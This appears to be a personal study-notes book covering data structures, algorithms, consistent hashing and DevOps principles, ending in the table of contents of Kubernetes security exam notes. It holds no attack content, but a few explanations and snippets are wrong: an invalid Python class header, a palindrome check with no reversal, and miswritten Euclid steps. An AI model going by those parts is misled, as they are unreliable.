<h2 id="arrays"><a class="header" href="#arrays">Arrays</a></h2>
<ul>
<li>An array is a data structure that stores elements with indexes in a contiguous block of memory</li>
<li>Arrays are indexed by a key, with a key taking the form of an offset from the starting location in memory. The first element of an array is 0 elements away from the start, the next is 1 element from the start, and so on. ‚ÄúOne element away‚Äù could be a byte, a word, etc., depending on the size of the data.</li>
<li>Retrieving or storing any element takes constant time (o(1)), and the entire array takes O(n) space. Inserting and deleting elements in an array is also O(n), which is slow, as every element may need to be moved.</li>
<li>When the number of elements is known when first creating the array, there is no wasted space.</li>
<li>Iterating through an array is likely to be much faster than any other data structure because of fewer cache misses.</li>
<li>Arrays are often homogeneous (homo = one kind, geneous/genous = producing) and static. A homogeneous data structure can only hold data of one type.</li>
</ul>
<h2 id="stacks"><a class="header" href="#stacks">Stacks</a></h2>
<ul>
<li>A stack is an abstract data type and a linear data structure that allows you to remove only the most recently added element.</li>
<li>You can imagine a stack as a pile of books. You can add or remove only the top book.</li>
<li>Last in, first out (LIFO) data structure</li>
<li>You can push items onto the stack and pop items off of the stack</li>
<li>Stacks can be bounded (limited in size) or unbounded</li>
<li>You can create a stack with a class that internally uses an array or linked list to keep track of items</li>
<li>Pushing and popping items from a stack are all O(1)</li>
<li>Programs typically use stacks internally to track function calls</li>
</ul>
<h4 id="examples-3"><a class="header" href="#examples-3">Examples</a></h4>
<pre><code class="language-python">class Stack:
    def __init__(self):
        self.items = []

    def push(self, item):
        self.items.append(item)

    def size(self):
        return len(self.items)

    def peek(self):
        if len(self.items) == 0:
            return None
        return self.items[-1]

    def pop(self):
        if len(self.items) == 0:
            return None
        item = self.items[-1]
        del self.items[-1]
        return item

#------------
from stack import Stack

def is_balanced(input_str):
    s = Stack()
    for i in input_str:
        if i == "(":
            s.push(i)
        elif i == ")":
            result = s.pop()
            if result == None:
                return False

    if s.size() != 0:
        return False
    return True
</code></pre>
<pre><code class="language-go">// a stack implementation

package main

import (
        "fmt"
)

type stack []string

func (s *stack) push(val string) {
        *s = append(*s, val)
}

func (s *stack) pop() (string, bool) {
        if s.isEmpty() {
                return "", false
        }
        index := len(*s) - 1
        element := (*s)[index]
        *s = (*s)[:index]
        return element, true
}

func (s *stack) isEmpty() bool {
        return len(*s) == 0
}

func main() {
        var s stack

        fmt.Println("empty: ", s.isEmpty())

        s.push("hello")
        s.push("world")

        fmt.Println("length: ", len(s))
        fmt.Println("empty: ", s.isEmpty())

        fmt.Println("popping")
        val, _ := s.pop()
        fmt.Println("popped:", val)
}
</code></pre>
<h2 id="heap"><a class="header" href="#heap">Heap</a></h2>
<ul>
<li>a heap is a data structure which satisfies the heap ordering property, either min-heap (the value of each node is no smaller than the value of it‚Äôs parent) or max-heap (the value of each node is no larger than the value of it‚Äôs parent). A heap is a rooted, nearly complete binary tree, where the key of the root is greater than the key of either of its children, and this is recursively true for the subtree rooted at each child.</li>
<li>a max-heap supports the operations find-max, extract-max (pop), insert (push), and increase-key (change a node‚Äôs key and then move the node to it‚Äôs new position in the graph)</li>
<li>heaps, like stacks, tend to be implemented with arrays</li>
<li>only one element can be removed at a time (also similar to stacks), but rather than the most recent element, it will be the maximum element (for max-heap) or the minimum element (for min-heap)</li>
<li>heaps are partially ordered based on the key of each element, such that the highest (or lowest) priority element is always stored at the root</li>
</ul>
<h2 id="queues"><a class="header" href="#queues">Queues</a></h2>
<ul>
<li>A queue is an abstract data type and a linear data structure which you can add items only to the rear and remove them from the front.</li>
<li>First in, first out (FIFO) data structure</li>
<li>Enqueueing means adding an item to the queue, dequeueing means removing an item from the queue</li>
<li>Queues work like the checkout lines at a grocery store.</li>
<li>A bounded queue limits how many items you can add to it.</li>
<li>Enqueueing and dequeueing, peeking, and getting the length of the queue are all O(1) regardless of the queues size</li>
</ul>
<h2 id="linked-lists"><a class="header" href="#linked-lists">Linked Lists</a></h2>
<ul>
<li>Similar to arrays, but elements in a linked list do not have indexes because your computer does not store the items in a linked list in sequential memory. Instead, a linked list contains a chain of nodes, with each node holding a piece of data and the next node‚Äôs location in the chain. The data in each node that stores the next node‚Äôs location in the linked list is called a pointer. The first node in a linked list is called a head. The last element in a linked list points to None.
<code>head &gt; a &gt; b &gt; c &gt; none</code></li>
<li>The only way to access an item in a linked list is to do a linear search for it, which is O(n). Adding and removing a node from a linked list is O(1), whereas inserting and deleting items from an array is O(n).</li>
<li>Memory management systems in operating systems use linked lists extensively, as do databases</li>
<li>There are many types of linked lists:
<ul>
<li>singly linked list: a type of linked list with pointers that point only to the next element. You can move through a singly linked list only by starting at the head and moving to the end.</li>
<li>doubly linked list: each node contains two pointers, one pointing to the next node and one pointing to the previous node. This allows you to move through a doubly linked list in either direction.</li>
<li>circular linked list: the last node points back to the first node</li>
</ul>
</li>
<li>Unlike normal lists, linked lists are not stored sequentially in memory, so they can grow and shrink dynamically without needing to reallocate or reorganize memory.</li>
</ul>
<p>Example:</p>
<pre><code class="language-python">class Node(self):
    def __init__(self, val):
        self.val = val
        self.next = None
        
    def set_next(self, next_node):
        self.next = next_node

    def __repr__(self):
        return self.val

</code></pre>
<h2 id="hash-tables"><a class="header" href="#hash-tables">Hash Tables</a></h2>
<ul>
<li>Hash tables are associative arrays that map keys to values</li>
<li>Dictionaries are one implementation of hash tables commonly found in programming languages</li>
<li>Hash tables use a hash function to convert a key into an index in an array where the corresponding value is stored</li>
<li>The hash function should:
<ul>
<li>Take a key and return an integer</li>
<li>Always return the same integer for the same key</li>
<li>Always return a valid index in the array</li>
</ul>
</li>
<li>A hash collision can occur when two keys hash to the same index.</li>
<li>To determine the index where a value is stored in a hash table, a hash function is used. One common hash function is to modulo the number you are storing in the hash table by the number of values the hash table can store. For example, you have a hash table that can store 7 values. You want to store the number 90. 90%7=6, so you would store the number 90 at index 6. This method can result in collisions if you have two values whose modulo results in the same index number.</li>
<li>a collision occurs when you have multiple values that map to the same spot.</li>
<li>The lookup, insertion, and deletion operations of a hash table are all o(1) on average.</li>
</ul>
<h2 id="trees"><a class="header" href="#trees">Trees</a></h2>
<ul>
<li>Trees are a hierarchical data structure made up of nodes connected by edges. A tree starts with a root node at the top. Each node can have child nodes connected underneath it. Nodes with child nodes are called parent nodes. Nodes that share the same parent are called sibling nodes. The connection between two nodes is called an edge. Nodes without child nodes are called leaf nodes, while nodes with child nodes are called branch nodes.</li>
<li>Trees are like linked lists in the sense that a root node holds references to its child nodes. However, tree nodes can have multiple children instead of just one.</li>
<li>A tree structure must abide by the following rules:
<ul>
<li>A tree node can have a value and a list of references to child nodes.</li>
<li>Children can only have a single parent</li>
</ul>
</li>
</ul>
<h2 id="binary-search-trees-bst"><a class="header" href="#binary-search-trees-bst">Binary Search Trees (BST)</a></h2>
<p><img src="images/algorithms/binary_search_tree.png" alt="Binary Search Tree">
<img src="images/algorithms/binary_search_tree_2.png" alt="Binary Search Tree in O(n)"></p>
<ul>
<li>Trees are not particularly useful unless they are ordered in some way. One of the most common types of trees is a binary search tree.</li>
<li>In addition to the constraints of a tree structure, a BST adds the following constraints:
<ul>
<li>Instead of an unbounded list of children, a parent node can only have two children</li>
<li>The left child‚Äôs value must be less than its parent‚Äôs value</li>
<li>The right child‚Äôs value must be more than its parent‚Äôs value.</li>
<li>No two nodes in the tree can have identical values</li>
</ul>
</li>
<li>Because of the constraints listed above, binary trees are ordered ‚Äòby default‚Äô, making them very performant.</li>
</ul>
<h4 id="example-3"><a class="header" href="#example-3">Example:</a></h4>
<pre><code class="language-python">import random

class User:
    def __init__(self, id):
        self.id = id
        user_names = [
            "Blake",
            "Ricky",
            "Shelley",
            "Dave",
            "George",
            "John",
            "James",
            "Mitch",
            "Williamson",
            "Burry",
            "Vennett",
            "Shipley",
            "Geller",
            "Rickert",
            "Carrell",
            "Baum",
            "Brownfield",
            "Lippmann",
            "Moses",
        ]
        self.user_name = f"{user_names[id % len(user_names)]}#{id}"

    def __eq__(self, other):
        return isinstance(other, User) and self.id == other.id

    def __lt__(self, other):
        return isinstance(other, User) and self.id &lt; other.id

    def __gt__(self, other):
        return isinstance(other, User) and self.id &gt; other.id

    def __repr__(self):
        return "".join(self.user_name)


def get_users(num):
    random.seed(1)
    users = []
    ids = []
    for i in range(num * 3):
        ids.append(i)
    random.shuffle(ids)
    ids = ids[:num]
    for id in ids:
        user = User(id)
        users.append(user)
    return users

# The Binary Search Tree Node class
class BSTNode:
    def __init__(self, val=None):
        self.left = None
        self.right = None
        self.val = val

    def insert(self, val):
        if not self.val:
            self.val = val
            return

        if self.val == val:
            return

        if val &lt; self.val:
            if not self.left:
                self.left = BSTNode(val=val)
            else:
                self.left.insert(val)
        else:
            if not self.right:
                self.right = BSTNode(val=val)
            else:
                self.right.insert(val)
</code></pre>
<ul>
<li>Inserting into a BST is O(log n) on average, but O(n) in the worst case (when each node has a single child, essentially creating a linked list.)</li>
<li>While it‚Äôs true that on average a BST has a time complexity of O(log n) for lookups, deletions, and insertions. This rule can quickly break down if the data is mostly or completely sorted. If mostly or completely sorted data is inserted into a binary tree, the tree will become deeper than it is wide. The BST‚Äôs time complexity depends on it being balanced, meaning that the left and right subtrees of any node differ in height by no more than one. If the tree becomes unbalanced, the time complexity for lookups, deletions, and insertions can degrade to O(n) in the worst case.</li>
</ul>
<h2 id="red-black-trees"><a class="header" href="#red-black-trees">Red Black Trees</a></h2>
<ul>
<li>A red-black tree is a self-balancing binary search tree where each node has an extra bit for denoting the color of the node, either red or black. By constraining the node colors on any path from the root to a leaf, red-black trees ensure that no such path is more than twice as long as any other, thus the tree remains approximately balanced.</li>
<li>red/black = true/false</li>
<li>Properties of red-black trees:
<ul>
<li>Each node is either red or black</li>
<li>The root is always black</li>
<li>All null leaf nodes are black</li>
<li>If a node is red, both its children must be black (no two reds in a row)</li>
<li>All paths from a single node go through the same number of black nodes</li>
</ul>
</li>
<li>When a branch starts to get too long, the tree rotates and recolors nodes to maintain balance
‚Ä¶.</li>
</ul>
<h2 id="tries"><a class="header" href="#tries">Tries</a></h2>
<ul>
<li>A trie, is simply a nested tree of dictionaries, where each key is a character that maps to the next character in a string. The end of a string is often marked with a special terminating character, such as an asterisk (*).</li>
<li>Example:
<pre><code class="language-json">{
    "h": {
        "e": {
            "l": {
                "l": {
                    "o": {
                        "*": True
                    }
                },
                "p": {
                    "*": True
                }
            }
        },
        "i": {
            "*": True
        }
    }
}
</code></pre>
</li>
<li>Tries are often used in autocomplete systems, spell checkers, and IP routing algorithms.
‚Ä¶.</li>
</ul>
<h2 id="graphs"><a class="header" href="#graphs">Graphs</a></h2>
<ul>
<li>A graph is a non-linear data structure made up of vertices (nodes) and edges that connect them.</li>
<li>A graph can be represented as a matrix</li>
<li>Example:</li>
</ul>
<pre><code class="language-python">[
  [False, True, False, False, True],
  [True, False, True, True, True],
  [False, True, False, True, False],
  [False, True, True, False, True],
  [True, True, False, True, False]
]
</code></pre>
<ul>
<li>An undirected graph can have up to n(n-1)/2 edges, where n is the number of vertices
‚Ä¶.</li>
</ul>
<h2 id="breadth-first-search-bfs"><a class="header" href="#breadth-first-search-bfs">Breadth-First Search (BFS)</a></h2>
<ul>
<li>BFS is an algorithm for traversing tree or graph data structures</li>
<li>It starts at the root (or an arbitrary node in the case of a graph) and explores all of the neighbor nodes at the present depth prior to moving on to the nodes at the next depth level.</li>
</ul>
<h2 id="depth-first-search-dfs"><a class="header" href="#depth-first-search-dfs">Depth-First Search (DFS)</a></h2>
<ul>
<li>DFS is an algorithm for traversing tree or graph data structures</li>
<li>It starts at the root (or an arbitrary node in the case of a graph) and explores as far as possible along each branch before backtracking.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="euclids-algorithm"><a class="header" href="#euclids-algorithm">Euclid‚Äôs Algorithm</a></h1>
<ul>
<li>Euclid‚Äôs Algorithm is an efficient way to find the greatest common factor of a number. First, you divide the number x by y, to find the remainder. Then you divide again, using the remainder for y and the previous y as the new x. You continue this process until the remainder is 0. The last divisor is the greatest common factor.</li>
</ul>
<p>For example:</p>
<p>20 / 12 = 8
12 / 8 = 4
8 / 4 = 2 // remainder 0 so the GCF is 4</p>
<p>The greatest common factor of 20 and 12 is 4</p>
<pre><code>def greatestCommonFactor(x,y):
  if y == 0:
    x,y = y,x
  while y != 0:
    x,y = y,x % y
  return x
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="fizzbuzz"><a class="header" href="#fizzbuzz">fizzbuzz</a></h1>
<h3 id="examples-4"><a class="header" href="#examples-4">Examples</a></h3>
<ul>
<li>Python</li>
</ul>
<pre><code>def fizzbuzz(n):
    for i in range(1, n + 1):
        if i % 3 == 0 and i % 5 == 0:
            print('FizzBuzz')
        elif i % 3 == 0:
            print('Fizz')
        elif i % 5 == 0:
            print('Buzz')
        else:
            print(i)
</code></pre>
<ul>
<li>Go</li>
</ul>
<pre><code>package main

import "fmt"

func main() {
    for i := 1; i &lt;= 100; i++ {
        if i%3 == 0 {
            fmt.Printf("fizz")
        }
        if i%5 == 0 {
            fmt.Printf("buzz")
        }
        if i%3 != 0 &amp;&amp; i%5 != 0 {
            fmt.Printf("%d", i)
        }
        fmt.Printf("\n")
    }
}
</code></pre>
<ul>
<li>c#</li>
</ul>
<pre><code>for (int i = 1; i &lt;= 100; i++)  
{  
    if (i % 3 == 0 &amp;&amp; i % 5 == 0)  
    {  
        Console.WriteLine("FizzBuzz");  
    }  
    else if (i % 3 == 0)  
    {  
       Console.WriteLine("Fizz");  
    }  
    else if (i % 5 == 0)  
    {  
       Console.WriteLine("Buzz");  
    }  
    else  
    {  
        Console.WriteLine(i);  
    }  
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="graph-theory"><a class="header" href="#graph-theory">Graph Theory</a></h1>
<p>A good way to learn about graph theory is the Konigsberg bridge problem. The town of Konigsberg had a river flowing through it, the river divided the city into four regions, which were connected by seven bridges. The question arose of whether it might be possible to take a walk through the city, crossing every bridge only once.</p>
<p><img src="images/graph_theory/konigsberg_map.png" alt="Konigsberg"></p>
<p>We can simplify the map by replacing each region with a vertex and each bridge with an edge between two vertexes:</p>
<p><img src="images/graph_theory/vertex.png" alt="VertexMap"></p>
<p>The key logical insight is to enter and leave a landmass requires two separate bridges, so any landmass which is not the starting or ending position must be the endpoint of an even number of bridges. In the case of Konigsberg, all four regions contained an odd number of bridges, making the problem unsolvable. A path through a graph which visits every edge exactly once is now called an Eulerian path.</p>
<p>Converting the map to a graph allows us to avoid Parkinson‚Äôs Law of Triviality.</p>
<p>A graph is a way of representing relationships in a set of data. When discussing the size of a graph, we often use ‚Äòn‚Äô for the number of vertices (nodes) and ‚Äòm‚Äô for the number of edges. The amount of space the graph requires depends on how we store the data. Two common methods are adjacency lists and adjacency matrices.</p>
<ul>
<li>adjacency Lists: When using an adjacency list, each node of the graph is stored with a list of nodes to which it is adjacent.</li>
<li>adjacency matrix:</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hashing"><a class="header" href="#hashing">Hashing</a></h1>
<h3 id="why-we-need-hashing"><a class="header" href="#why-we-need-hashing">Why we need hashing</a></h3>
<p>To achieve horizontal scaling, it is important to distribute requests/data efficiently across servers.</p>
<h3 id="traditional-modulus-hashing"><a class="header" href="#traditional-modulus-hashing">Traditional (modulus) Hashing</a></h3>
<p>If you have <em>n</em> cache servers, a common way to balance the load is to use the following hash method:</p>
<pre><code>serverIndex = hash(key) % n --where n is the number of servers in the pool
</code></pre>
<p>Suppose we have 4 servers in the pool and 8 string keys with their hashes:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>key</th><th>hash</th><th>hash % 4</th></tr>
</thead>
<tbody>
<tr><td>key0</td><td>18358617</td><td>1</td></tr>
<tr><td>key1</td><td>26143584</td><td>0</td></tr>
<tr><td>key2</td><td>18131146</td><td>2</td></tr>
<tr><td>key3</td><td>35863496</td><td>0</td></tr>
<tr><td>key4</td><td>34085809</td><td>1</td></tr>
<tr><td>key5</td><td>27581703</td><td>3</td></tr>
<tr><td>key6</td><td>38164978</td><td>2</td></tr>
<tr><td>key7</td><td>22530351</td><td>3</td></tr>
</tbody>
</table>
</div>
<p>To fetch the server where the key is stored, we perform the modular operation f(key) % 4. So hash(key0) % 4 means the client must contact server 1 fetch the cached data.</p>
<p>This approach works well when the size of the server pool doesn‚Äôt change. However, if new servers are added or existing servers removed, the hashing algorith changes. For example, if we removed a server, the hash algorith is now hash(key) % 3. If an existing client already had data in the cache, and they used this updated hash algorithm, they will receive a different server index that doesn‚Äôt contain their cached data. This results in cache misses. When one server goes offline or is removed, most cache clients will connect to the wrong servers to fetch data. Consistent Hashing is a method to fix this problem.</p>
<h3 id="consistent-hashing"><a class="header" href="#consistent-hashing">Consistent Hashing</a></h3>
<p>Consistent hashing is a technique used in distributed systems to divide data among multiple caching servers or nodes. It aims to evenly distribute the data and minimize the amount of data that needs to be moved when nodes are added or removed from the system.</p>
<p>With consistent hashing, the hash space is represented as a ring, also known as a hash ring. Each server is assigned a position on the ring based on its hash value. The data is also hashed, and its hash value is mapped onto the ring. To determine which server should store the data, the position of the data‚Äôs hash value is found on the ring, and the next server in a clockwise direction on the ring becomes the data‚Äôs assigned server.</p>
<p>This approach provides several advantages:</p>
<ol>
<li>Load balancing: Since the servers are evenly distributed on the ring, the data is also distributed evenly, minimizing hotspots and ensuring a balanced load across the nodes.</li>
<li>Scalability: When a new server is added, only a portion of the data needs to be remapped to the new server, reducing the overall amount of data movement. Similarly, when a server is removed, only the data assigned to that server needs to be redistributed.</li>
<li>Fault tolerance: In the event of a server failure, only the data assigned to that server needs to be remapped, minimizing the impact on the overall system.</li>
<li>Consistency: The term ‚Äúconsistent‚Äù in consistent hashing refers to the stability of the mapping between data and servers. In traditional hashing, small changes in the number of servers can drastically change the assignment of data, but consistent hashing minimizes such changes.</li>
</ol>
<p>Overall, consistent hashing allows for efficient and dynamic data distribution in distributed systems, enabling scalability, fault tolerance, and load balancing.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="string-algorithms"><a class="header" href="#string-algorithms">string algorithms</a></h1>
<h2 id="anagram-detection"><a class="header" href="#anagram-detection">Anagram Detection</a></h2>
<ul>
<li>Two strings are anagrams if they contain the same letters, but not necessarily in the same order.</li>
<li>‚Äòcar‚Äô and ‚Äòarc‚Äô are anagrams</li>
<li>The key to determining if 2 strings are anagrams is to sort them. If the sorted strings are the same, they are anagrams.</li>
<li>Rules for creating an algorithm to determine if 2 strings are an anagram
<ul>
<li>remove spaces in the words</li>
<li>convert all letters to lowercase</li>
<li>trim spaces if necessary</li>
<li>sort the strings</li>
<li>compare the strings to see if they are the same</li>
</ul>
</li>
</ul>
<h2 id="palindrome-detection"><a class="header" href="#palindrome-detection">Palindrome Detection</a></h2>
<ul>
<li>A palindrome is a word that reads the same backword as forward</li>
<li>Hannah, mom, wow, and racecar are all examples of palindromes</li>
<li>A simple way to see if a string is a palindrome is to copy it and compare the copy to the original. If they are equal, the string is a palindrome.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="devops"><a class="header" href="#devops">DevOps</a></h1>
<h2 id="directory-map-11"><a class="header" href="#directory-map-11">Directory Map</a></h2>
<ul>
<li><a href="#devops-principles">principles</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="devops-principles"><a class="header" href="#devops-principles">DevOps Principles</a></h1>
<ol>
<li>Customer-centric action - All activity around building software must frequently involve the clients</li>
<li>Create with the end in mind - Focus on building a whole product that is being presented to real customers</li>
<li>End-to-end responsibility - All members of a devops team are responsible for the software they deliver</li>
<li>Cross-functional autonomous teams - Organizations that work with vertical and fully responsible teams will need to let those teams work completely independently throughout the whole life cycle. To do this, each team member must have a broad range of skills, ranging from administration to development.</li>
<li>Continuous Improvement - Adapt to changes continuously</li>
<li>Automate everything - focus on automation in everything that you do</li>
</ol>
<h2 id="the-four-stages-of-the-sdlc"><a class="header" href="#the-four-stages-of-the-sdlc">The four stages of the SDLC:</a></h2>
<ul>
<li>Plan</li>
<li>Develop</li>
<li>Deliver</li>
<li>Operate</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
<h2 id="directory-map-12"><a class="header" href="#directory-map-12">Directory Map</a></h2>
<ul>
<li><a href="kubernetes/cks">cks</a></li>
<li><a href="kubernetes/kcna">kcna</a></li>
<li><a href="kubernetes/kcsa">kcsa</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cks"><a class="header" href="#cks">CKS</a></h1>
<h2 id="directory-map-13"><a class="header" href="#directory-map-13">Directory Map</a></h2>
<ul>
<li><a href="#certified-kubernetes-security-specialist-cks-notes">notes</a></li>
<li><a href="#kubernetes-security-specialist-cks-practice-scenarios">questions</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="certified-kubernetes-security-specialist-cks-notes"><a class="header" href="#certified-kubernetes-security-specialist-cks-notes">Certified Kubernetes Security Specialist (CKS) Notes</a></h1>
<p align="center"><img width="180" alt="portfolio_view" src="kubernetes/cks/badge.png"></p>

<p align="center"><img width="300" alt="portfolio_view" src="kubernetes/cks/kubernetes.png"></p>

<h4 align="center"><a href="https://www.cncf.io/certification/cks/">https://www.cncf.io/certification/cks/</a>
<h1 align="center">Certified Kubernetes Security Specialist (CKS) Notes</h1>

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList= alse} -->
<h2 id="table-of-contents-7"><a class="header" href="#table-of-contents-7">Table of Contents</a></h2>
<ul>
<li>
<p><a href="#exam">Exam</a></p>
<ul>
<li><a href="#outline">Outline</a></li>
<li><a href="#cirriculum">Cirriculum</a></li>
<li><a href="#changes">Changes</a></li>
<li><a href="#software--environment">Software / Environment</a></li>
<li><a href="#exam-environment-setup">Exam Environment Setup</a>
<ul>
<li><a href="#terminal-shortcutsaliases">Terminal Shortcuts/Aliases</a></li>
<li><a href="#terminal-command-completion">Terminal Command Completion</a></li>
<li><a href="#vim">VIM</a>
<ul>
<li><a href="#pasting-text-into-vim">Pasting Text Into VIM</a></li>
</ul>
</li>
<li><a href="#tmux">tmux</a>
<ul>
<li><a href="#mouse-support">Mouse Support</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><a href="#preparation">Preparation</a></p>
<ul>
<li><a href="#study-resources">Study Resources</a></li>
<li><a href="#practice">Practice</a></li>
</ul>
</li>
<li>
<p><a href="#fundamentals">Fundamentals</a></p>
</li>
<li>
<p><a href="#1-cluster-setup">Cluster Setup</a></p>
<ul>
<li><a href="#cis-benchmark">CIS Benchmark</a>
<ul>
<li><a href="#what-is-a-security-benchmark">What is a security benchmark?</a></li>
<li><a href="#kubebench">KubeBench</a></li>
</ul>
</li>
<li><a href="#cluster-upgrades">Cluster Upgrades</a>
<ul>
<li><a href="#upgrade-process">Upgrade Process</a></li>
<li><a href="#upgrading-with-kubeadm">Upgrading with Kubeadm</a></li>
</ul>
</li>
<li><a href="#network-policies">Network Policies</a>
<ul>
<li><a href="#overview-9">Overview</a></li>
<li><a href="#key-concepts-1">Key Concepts</a></li>
<li><a href="#common-fields-in-a-network-policy">Common Fields in a Network Policy</a></li>
<li><a href="#example-network-policies">Example Network Policies</a>
<ul>
<li><a href="#allow-all-ingress-traffic">Allow All Ingress Traffic</a></li>
<li><a href="#deny-all-ingress-and-egress-traffic">Deny All Ingress and Egress Traffic</a></li>
<li><a href="#allow-specific-ingress-from-a-namespace">Allow Specific Ingress from a Namespace</a></li>
<li><a href="#allow-egress-to-a-specific-ip">Allow Egress to a Specific IP</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#cilium-network-policy">Cilium Network Policy</a>
<ul>
<li><a href="#cilium-network-policy-structure">Cilium Network Policy Structure</a></li>
<li><a href="#layer-3-rules">Layer 3 Rules</a></li>
<li><a href="#examples-5">Examples</a>
<ul>
<li><a href="#default-deny-all">Default Deny All</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#kubernetes-ingress">Kubernetes Ingress</a>
<ul>
<li><a href="#what-is-ingress">What is Ingress?</a></li>
<li><a href="#why-use-ingress">Why Use Ingress?</a></li>
<li><a href="#key-components-of-ingress">Key Components of Ingress</a></li>
<li><a href="#ingress-resource-configuration">Ingress Resource Configuration</a></li>
<li><a href="#basic-structure">Basic Structure</a></li>
<li><a href="#ingress-with-tls">Ingress with TLS</a></li>
<li><a href="#annotations">Annotations</a></li>
</ul>
</li>
<li><a href="#protecting-node-metadata-and-endpoints">Protecting Node Metadata and Endpoints</a>
<ul>
<li><a href="#protecting-endpoints">Protecting Endpoints</a></li>
<li><a href="#protecting-node-metadata">Protecting Node Metadata</a></li>
</ul>
</li>
<li><a href="#verify-kubernetes-binaries">Verify Kubernetes Binaries</a></li>
<li><a href="#securing-etcd">Securing etcd</a>
<ul>
<li><a href="#play-with-etcd">Play with etcd</a></li>
<li><a href="#encrypting-data-in-transit-in-etcd">Encrypting data in transit in etcd</a></li>
<li><a href="#encrypting-data-at-rest-in-etcd">Encrypting data at rest in etcd</a></li>
</ul>
</li>
<li><a href="#securing-kube-apiserver">Securing kube-apiserver</a>
<ul>
<li><a href="#access-controls">Access Controls</a></li>
<li><a href="#authentication">Authentication</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><a href="#2-cluster-hardening">Cluster Hardening</a></p>
<ul>
<li><a href="#securing-access-to-the-kubeapi-server">Securing Access to the KubeAPI Server</a></li>
<li><a href="#authentication">Authentication</a>
<ul>
<li><a href="#user-accounts">User accounts</a></li>
<li><a href="#service-accounts">Service Accounts</a></li>
</ul>
</li>
<li><a href="#tls-certificates">TLS Certificates</a></li>
<li><a href="#kubelet-security">kubelet Security</a></li>
<li><a href="#authorization">Authorization</a>
<ul>
<li><a href="#roles-and-clusterroles">Roles and ClusterRoles</a></li>
<li><a href="#role-bindings-and-cluster-role-bindings">Role Bindings and Cluster Role Bindings</a></li>
</ul>
</li>
<li><a href="#securing-node-metadata">Securing Node Metadata</a></li>
</ul>
</li>
<li>
<p><a href="#3-system-hardening">System Hardening</a></p>
<ul>
<li><a href="#principle-of-least-privilege">Principle of Least Privilege</a></li>
<li><a href="#limit-access-to-nodes">Limit access to nodes</a>
<ul>
<li><a href="#managing-local-users-and-groups">Managing Local Users and Groups</a></li>
<li><a href="#securing-ssh">Securing SSH</a></li>
<li><a href="#using-sudo">Using sudo</a></li>
<li><a href="#remove-packages-packages">Remove Packages Packages</a></li>
<li><a href="#restrict-kernel-modules">Restrict Kernel Modules</a></li>
<li><a href="#disable-open-ports">Disable Open Ports</a></li>
</ul>
</li>
<li><a href="#tracing-syscalls">Tracing Syscalls</a>
<ul>
<li><a href="#strace">strace</a></li>
<li><a href="#aquasec-tracee">AquaSec Tracee</a></li>
<li><a href="#restricting-access-to-syscalls-with-seccomp">Restricting Access to syscalls with seccomp</a></li>
</ul>
</li>
<li><a href="#restrict-access-to-file-systems">Restrict access to file systems</a>
<ul>
<li><a href="#apparmor">AppArmor</a></li>
</ul>
</li>
<li><a href="#linux-capabilities-in-pods">Linux Capabilities in Pods</a></li>
</ul>
</li>
<li>
<p><a href="#4-minimize-microservice-vulnerabilities">Minimize Microservice Vulnerabilities</a></p>
<ul>
<li><a href="#pod-security-admission">Pod Security Admission</a></li>
<li><a href="#security-contexts">Security Contexts</a></li>
<li><a href="#admission-controllers">Admission Controllers</a></li>
<li><a href="#open-policy-agent">Open Policy Agent</a>
<ul>
<li><a href="#opa-in-kubernetes">OPA in Kubernetes</a>
<ul>
<li><a href="#gatekeeper">GateKeeper</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#kubernetes-secrets">Kubernetes Secrets</a></li>
<li><a href="#container-sandboxing">Container Sandboxing</a>
<ul>
<li><a href="#gvisor">gVisor</a></li>
<li><a href="#kata-containers">Kata Containers</a></li>
</ul>
</li>
<li><a href="#runtimeclass">RuntimeClass</a>
<ul>
<li><a href="#to-use-a-runtime-class">To use a runtime class</a></li>
</ul>
</li>
<li><a href="#resource-quotas">Resource Quotas</a></li>
<li><a href="#api-priority-and-fairness">API Priority and Fairness</a></li>
<li><a href="#pod-priority-and-preemption">Pod Priority and Preemption</a></li>
<li><a href="#pod-to-pod-encryption">Pod to Pod Encryption</a></li>
</ul>
</li>
<li>
<p><a href="#5-supply-chain-security">Supply Chain Security</a></p>
<ul>
<li><a href="#sbom">SBOM</a></li>
<li><a href="#reduce-docker-image-size">Reduce docker image size</a></li>
<li><a href="#static-analysis">Static Analysis</a>
<ul>
<li><a href="#sbom-1">SBOM</a></li>
<li><a href="#kubesec">Kubesec</a></li>
<li><a href="#syft">Syft</a></li>
<li><a href="#grype">Grype</a></li>
<li><a href="#kube-linter">Kube-linter</a></li>
</ul>
</li>
<li><a href="#scanning-images-for-vulnerabilities">Scanning Images for Vulnerabilities</a>
<ul>
<li><a href="#trivy">trivy</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><a href="#6-monitoring-logging-and-runtime-security">Monitoring, Logging, and Runtime Security</a></p>
<ul>
<li><a href="#falco">falco</a></li>
<li><a href="#ensuring-container-immutability">Ensuring Container Immutability</a></li>
<li><a href="#audit-logs">Audit Logs</a>
<ul>
<li><a href="#sample-audit-policy">Sample Audit Policy</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /code_chunk_output -->
<h1 id="exam"><a class="header" href="#exam">Exam</a></h1>
<h3 id="outline"><a class="header" href="#outline">Outline</a></h3>
<ul>
<li>https://github.com/cncf/curriculum/blob/master/CKS_Curriculum%20v1.31.pdf</li>
</ul>
<h3 id="cirriculum"><a class="header" href="#cirriculum">Cirriculum</a></h3>
<p>Exam objectives that outline the knowledge, skills, and abilities that a Certified Kubernetes Security Specialist (CKS) can be expected to demonstrate.</p>
